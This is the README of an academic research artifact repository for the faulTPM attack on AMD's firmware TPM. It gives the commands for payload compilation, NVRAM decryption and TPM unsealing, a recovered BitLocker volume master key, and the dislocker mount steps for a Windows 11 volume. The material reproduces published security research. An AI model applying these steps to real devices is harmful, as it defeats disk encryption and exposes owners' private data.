# faulTPM - Artifacts

This repository aims to reproduce the results of our fTPM attack without any hardware access. Where physical steps and access to real hardware would be required, we provide sample data from a Lenovo Ideapad 5 Pro 16ACH6 laptop.

## Requirements

- Python 3.8
- Update submodules: `git submodule update --init`
- Install latest version of PSPTool: `cd tools/PSPTool; pip3 install .`
- Install amdnvtool: `cd tools/amd-nv-tool; pip3 install .`
- Install pycrypto: `pip3 install pycrypto`
- *If you want to compile our payload in 2. yourself*: `arm-none-eabi` toolchain in your `$PATH`

## fTPM Attack

The following steps (1-6) are aligned with the steps described in Section 4.5 (Results) of our paper.

1. **Backup BIOS flash image using an SPI flash programmer** --> [data/ideapad.rom](data/ideapad.rom)
2. **Connect the fault injection hardware and determine the attack parameters**
3. **Compile & deploy the payload extraction the key derivation secret** --> [data/ideapad_payload.rom](data/ideapad_payload.rom)

  ```bash
  cd extract_seed_payload
  make
  ```
***Note**: We have also provided the NV-secret (LSB) extraction payload. But since this payload does not apply to the (Zen 3) ideadpad laptop, have provided no extracted secrets or captures.***
***Note**: The resulting BIOS image will not be byte-identical with the provided image, since the fake AMD Root Key as well as all signatures differ on each PSPTool run.***

4. **Start the logic analyzer to capture the extracted key derivation seed via SPI** --> [data/ideapad.cap](data/ideapad.cap)

5. **Start glitch attack cycle on target machine until payload was executed successfully**
   1. Deploy the payload ([data/ideapad_payload.rom](data/ideapad_payload.rom)) using an SPI flash programmer
    2. Mount the voltage glitching attack until the system accepts our custom AMD Public Key
    3. Extract the decryption seed from the SPI trace --> [data/ideapad_seed.hex](data/ideapad_seed.hex)
   
6. **Parse & decrypt NVRAM using BIOS ROM backup and payload output with amdnvtool** --> [data/ideapad.nvram](data/ideapad.nvram)

  ```
  amdnvtool data/ideapad.rom -s $(cat data/ideapad_seed.hex)
  ```

7. This is described by the following section.

## TPM object decryption

To demonstrate our TPM object decryption capabilities, this repository includes a sample output of `dislocker-metadata` of a *TPM-only* BitLocker-protected Windows 11 volume: [data/dislocker-metadata.sample-out](data/dislocker-metadata.sample-out)

Together with the previously decrypted `nvram.bin`, we are able to decrypt the BitLocker Volume Master Key (VMK) like this: 

```bash
$ grep -B5 -A23 TPM_ENCODED data/ideapad.dislocker-metadata 
Mon May  2 22:23:36 2022 [INFO] ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Mon May  2 22:23:36 2022 [INFO] Total datum size: 0x012e (302) bytes
Mon May  2 22:23:36 2022 [INFO] Datum entry type: 0
Mon May  2 22:23:36 2022 [INFO]    `--> ENTRY TYPE UNKNOWN 1
Mon May  2 22:23:36 2022 [INFO] Datum value type: 6
Mon May  2 22:23:36 2022 [INFO]    `--> TPM_ENCODED -- Total size header: 12 -- Nested datum: no
Mon May  2 22:23:36 2022 [INFO] Status: 0x1
Mon May  2 22:23:36 2022 [INFO] Unknown: 0x815
Mon May  2 22:23:36 2022 [INFO] Payload:
Mon May  2 22:23:36 2022 [INFO] 0x00000000 00 aa 00 20 7d 92 e4 49-91 86 1d fd 69 f0 11 91 
Mon May  2 22:23:36 2022 [INFO] 0x00000010 5e b1 8e d6 62 8c 3c ce-0a d9 a1 0e 92 79 53 76 
Mon May  2 22:23:36 2022 [INFO] 0x00000020 4d 9a 16 a2 00 10 ef 59-1c e1 45 32 52 6d d3 24 
Mon May  2 22:23:36 2022 [INFO] 0x00000030 9c 40 0d 86 b1 c5 77 98-f5 39 a0 e7 22 8a c3 f1 
Mon May  2 22:23:36 2022 [INFO] 0x00000040 4f 0c 70 a7 ea d8 68 2f-cd 05 5b da 36 93 72 22 
Mon May  2 22:23:36 2022 [INFO] 0x00000050 15 26 21 f4 5b 4b 62 0d-be bd 19 25 3b f1 d3 35 
Mon May  2 22:23:36 2022 [INFO] 0x00000060 0c 19 6e 2b cd a8 be ae-0a 67 0d 5f 5c 00 a3 46 
Mon May  2 22:23:36 2022 [INFO] 0x00000070 2c 96 ad c4 4a 01 39 43-a9 63 17 99 23 d9 af d5 
Mon May  2 22:23:36 2022 [INFO] 0x00000080 0d ce c0 eb 8f 00 c5 8f-31 a5 ad 4f a1 e1 bd 6a 
Mon May  2 22:23:36 2022 [INFO] 0x00000090 b0 75 c8 8c d4 a2 c8 01-a4 f9 9a af 7c f0 77 85 
Mon May  2 22:23:36 2022 [INFO] 0x000000a0 6f bf 33 28 87 be f9 64-a0 73 ff 0c 00 4e 00 08 
Mon May  2 22:23:36 2022 [INFO] 0x000000b0 00 0b 00 00 04 12 00 20-a8 32 71 5f 9b 29 f4 0e 
Mon May  2 22:23:36 2022 [INFO] 0x000000c0 2b 8e 42 79 7f 81 3c 56-5f 1a 61 82 de 39 87 f4 
Mon May  2 22:23:36 2022 [INFO] 0x000000d0 2b b8 34 58 6f 5f 8f 4e-00 10 00 20 db ee 36 c0 
Mon May  2 22:23:36 2022 [INFO] 0x000000e0 14 cb 2c 1c a3 ba 8e 98-a1 62 88 81 73 7b 01 28 
Mon May  2 22:23:36 2022 [INFO] 0x000000f0 6e 0a c8 b4 ff dd 99 80-83 34 be 95 00 20 0f 2c 
Mon May  2 22:23:36 2022 [INFO] 0x00000100 65 73 ff 16 74 dd 0d 26-56 dc f3 5d 9e 27 67 83 
Mon May  2 22:23:36 2022 [INFO] 0x00000110 2c fd 8c 88 8c 1b 46 78-31 dc a8 50 d5 a4 03 15 
Mon May  2 22:23:36 2022 [INFO] 0x00000120 08 00 
Mon May  2 22:23:36 2022 [INFO] ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
$ grep -B5 -A23 TPM_ENCODED data/ideapad.dislocker-metadata \
| grep 0x00000 | grep -oE "([ -][0-9a-f]{2})+ $" \
| sed "s/[ -]//g" | xxd -r -p > ideapad.tpm
$ python tools/amd_ftpm2_unseal.py data/ideapad.nvram ideapad.tpm 
protector_seed = b4c52c245e00175ba166e86a5fe6043defc527e95633c00c0d59f45af5fbf110
hmac_key = b14c825a7e7b2582843fce420bef7227636c25440efd46a0d9457b8c669a95a6
aes_key = ef96c28bd33bffd4c092a10cad00a35a
decrypted sensitive_data = 007400080020000000000000000000000000000000000000000000000000000000000000000000207dd75598bd8933e2a030f07e5a91bf92f209c6596d583ed645fa31eea2375c91002c2c000500010000000320000063e2462ee119b6634cea51428ccdb1d0a7147116916b8ebb77fca8a369c1365e
decrypted vmk = 63e2462ee119b6634cea51428ccdb1d0a7147116916b8ebb77fca8a369c1365e
```

This VMK can now be used with `dislocker` to mount the BitLocker-protected Windows 11, e.g., from a Live Linux booted on the same system.

```bash
# echo 63e2462ee119b6634cea51428ccdb1d0a7147116916b8ebb77fca8a369c1365e | xxd -r -p >ideapad.vmk
# dislocker-fuse -K ideapad.vmk -V /dev/nvme0n1p3 /mnt
# ls /mnt
dislocker-file
# fdisk -l /mnt/dislocker-file 
Disk /mnt/dislocker-file: 99.29 GiB, 106617110528 bytes, 208236544 sectors
Units: sectors of 1 * 512 = 512 bytes
Sector size (logical/physical): 512 bytes / 512 bytes
I/O size (minimum/optimal): 512 bytes / 512 bytes
Disklabel type: dos
Disk identifier: 0x73736572

Device               Boot      Start        End    Sectors   Size Id Type
/mnt/dislocker-file1      1920221984 3736432267 1816210284   866G 72 unknown
/mnt/dislocker-file2      1936028192 3889681299 1953653108 931.6G 6c unknown
/mnt/dislocker-file3               0          0          0     0B  0 Empty
/mnt/dislocker-file4        27722122   27722568        447 223.5K  0 Empty

Partition table entries are not in disk order.
# mount /mnt/dislocker-file /mnt2
# ls /mnt2
'$Recycle.Bin'             pagefile.sys           swapfile.sys
'$WinREAgent'              PerfLogs              'System Volume Information'
'Documents and Settings'   ProgramData            Users
 DumpStack.log            'Program Files'         Windows
 DumpStack.log.tmp        'Program Files (x86)'
 hiberfil.sys              Recovery
```
